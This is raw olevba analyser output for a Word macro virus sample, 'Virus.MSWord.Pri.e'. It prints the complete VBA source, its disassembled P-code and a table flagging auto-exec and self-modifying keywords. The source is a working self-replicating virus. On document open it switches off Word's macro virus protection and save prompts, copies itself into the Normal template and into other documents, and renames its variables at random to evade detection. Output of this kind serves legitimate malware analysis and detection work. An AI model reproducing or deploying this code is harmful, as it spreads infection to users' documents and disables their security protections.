olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If 99999 = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
RD5051 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UH326 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set JH2131 = ActiveDocument.VBProject.VBComponents.Item(1)
KG8744 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set JH2131 = NormalTemplate.VBProject.VBComponents.Item(1)
IB5392 = True
Call QF7755_EA4393
ActiveDocument.Saved = True
End If
If IB5392 <> True And KG8744 <> True Then GoTo CH4811
If IB5392 = True Then JH2131.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RD5051 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If KG8744 = True Then JH2131.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UH326 - 3))
CH4811:
If UH326 <> 0 And RD5051 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function QF7755_EA4393()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "MT7964": r1(2) = "EF1851": r1(3) = "QF2046": r1(4) = "DK3675": r1(5) = "EA4393": r1(6) = "RD5051"
r1(7) = "UH326": r1(8) = "KG8744":: r1(9) = "JH2131": r1(10) = "IB5392": r1(11) = "CH4811": r1(12) = "QF7755": r1(13) = "QM9930": r1(14) = "KM6758"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EA4393(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function EA4393(KM6758, QM9930 As String)
On Error Resume Next
Dim MT7964 As Long: Dim EF1851 As Long: Dim QF2046 As Long: Dim DK3675 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
MT7964 = 1: EF1851 = 1: QF2046 = .CountOfLines: DK3675 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QM9930, MT7964, EF1851, QF2046, DK3675, True)
strline = .Lines(MT7964, 1)
strline = Left(strline, EF1851 - 1) & KM6758 & Mid(strline, DK3675)
.replaceline MT7964, strline
MT7964 = QF2046 + 1: EF1851 = 1:
QF2046 = .CountOfLines
DK3675 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pri.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5397 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	LitDI4 0x869F 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #5:
' 	Ld msoShapePentagon 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #7:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #8:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St RD5051 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UH326 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set JH2131 
' Line #13:
' 	LitVarSpecial (True)
' 	St KG8744 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set JH2131 
' Line #17:
' 	LitVarSpecial (True)
' 	St IB5392 
' Line #18:
' 	ArgsCall (Call) QF7755_EA4393 0x0000 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld IB5392 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld KG8744 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CH4811 
' 	EndIf 
' Line #22:
' 	Ld IB5392 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld RD5051 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld JH2131 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #23:
' 	Ld KG8744 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "Private Sub Document_Open"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld UH326 
' 	LitDI2 0x0003 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld JH2131 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #24:
' 	Label CH4811 
' Line #25:
' 	Ld UH326 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld RD5051 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #26:
' 	EndSub 
' 	QuoteRem 0x0008 0x0039 "W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]"
' Line #27:
' 	FuncDefn (Private Function QF7755_EA4393(id_FFFE As Variant))
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	ArgsCall Read 0x0000 
' Line #30:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn r1 (As String)
' Line #31:
' 	LitStr 0x0006 "MT7964"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EF1851"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "QF2046"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "DK3675"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EA4393"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RD5051"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #32:
' 	LitStr 0x0005 "UH326"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KG8744"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0006 "JH2131"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IB5392"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CH4811"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "QF7755"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "QM9930"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KM6758"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #34:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #35:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) EA4393 0x0002 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0017 "VAMP v1.0 [thanks Vic!]"
' Line #38:
' 	FuncDefn (Private Function EA4393(KM6758, QM9930 As String, id_FFFE As Variant))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Dim 
' 	VarDefn MT7964 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn EF1851 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn QF2046 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn DK3675 (As Long)
' Line #41:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #42:
' 	LitDI2 0x0001 
' 	St MT7964 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St EF1851 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St QF2046 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St DK3675 
' Line #43:
' 	Ld QM9930 
' 	Ld MT7964 
' 	Ld EF1851 
' 	Ld QF2046 
' 	Ld DK3675 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #44:
' 	Ld MT7964 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #45:
' 	Ld strline 
' 	Ld EF1851 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld KM6758 
' 	Concat 
' 	Ld strline 
' 	Ld DK3675 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #46:
' 	Ld MT7964 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	Ld QF2046 
' 	LitDI2 0x0001 
' 	Add 
' 	St MT7964 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St EF1851 
' 	BoS 0x0000 
' Line #48:
' 	MemLdWith CountOfLines 
' 	St QF2046 
' Line #49:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St DK3675 
' Line #50:
' 	Loop 
' Line #51:
' 	EndWith 
' Line #52:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

